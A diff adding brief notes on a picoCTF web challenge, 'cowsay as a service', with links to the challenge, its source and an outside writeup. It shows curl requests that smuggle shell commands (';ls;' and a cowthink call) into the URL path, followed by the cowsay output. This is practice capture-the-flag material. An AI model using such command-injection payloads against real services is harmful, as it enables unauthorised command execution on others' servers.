@@ -1,0 +1,33 @@
+https://play.picoctf.org/practice/challenge/202?category=1&page=2
+
+Now presenting cowsay as a service
+
+https://caas.mars.picoctf.net/
+
+download index.js
+https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js
+
+
+https://xhacka.github.io/posts/writeup/2023/07/05/caas/
+curl "https://caas.mars.picoctf.net/cowsay/0w0;ls;"
+
+
+
+
+curl  "https://caas.mars.picoctf.net/cowsay/picoCTF;%20%2Fusr%2Fgames%2Fcowthink%20hi;"
+ _________
+< picoCTF >
+ ---------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+ ____
+( hi )
+ ----
+        o   ^__^
+         o  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
